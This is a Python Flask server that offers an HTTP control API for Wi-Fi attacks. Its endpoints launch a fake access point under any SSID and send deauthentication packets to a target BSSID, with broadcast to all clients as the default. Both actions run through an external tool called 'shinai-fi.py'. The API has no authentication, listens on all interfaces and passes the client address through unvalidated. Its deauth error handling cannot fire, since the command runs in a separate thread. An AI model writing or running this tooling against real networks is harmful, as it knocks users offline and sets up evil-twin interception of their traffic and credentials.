from flask import Flask, request, jsonify
import subprocess
import threading
import re
import time

app = Flask(__name__)

# Track active processes
active_processes = {}

def validate_mac(mac):
    return re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac)

def validate_ssid(ssid):
    return len(ssid) >= 1 and len(ssid) <= 32

@app.route('/ap/start', methods=['POST'])
def start_fake_ap():
    ssid = request.json.get('ssid')
    if not ssid or not validate_ssid(ssid):
        return jsonify({"error": "Invalid SSID"}), 400
    
    try:
        # Start in background with logging
        proc = subprocess.Popen(
            ["python3", "shinai-fi.py", "--ap", "-e", ssid],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        active_processes['ap'] = proc
        # Verify AP creation
        time.sleep(2)
        if not check_ap_active(ssid):
            raise RuntimeError("AP creation failed")
        return jsonify({"status": f"AP '{ssid}' started", "pid": proc.pid})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/deauth', methods=['POST'])
def deauth():
    bssid = request.json.get('bssid')
    client = request.json.get('client', "ff:ff:ff:ff:ff:ff")  # Broadcast
    count = request.json.get('count', 10)  # Default 10 packets
    
    if not validate_mac(bssid):
        return jsonify({"error": "Invalid BSSID"}), 400

    try:
        # Run deauth attack in background thread
        def run_deauth():
            subprocess.run(
                ["python3", "shinai-fi.py", "--deauth", "-b", bssid, 
                 "-c", client, "-n", str(count)],
                check=True
            )
        
        thread = threading.Thread(target=run_deauth)
        thread.start()
        return jsonify({"status": f"Deauth sent to {bssid}", "count": count})
    except subprocess.CalledProcessError as e:
        return jsonify({"error": f"Deauth failed: {e.stderr}"}), 500

def check_ap_active(ssid):
    try:
        scan = subprocess.check_output(["iwlist", "wlan0", "scan"], text=True)
        return ssid in scan
    except subprocess.CalledProcessError:
        return False

@app.route('/ap/stop', methods=['POST'])
def stop_ap():
    if 'ap' not in active_processes:
        return jsonify({"error": "No active AP"}), 400
    
    active_processes['ap'].terminate()
    return jsonify({"status": "AP stopped"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)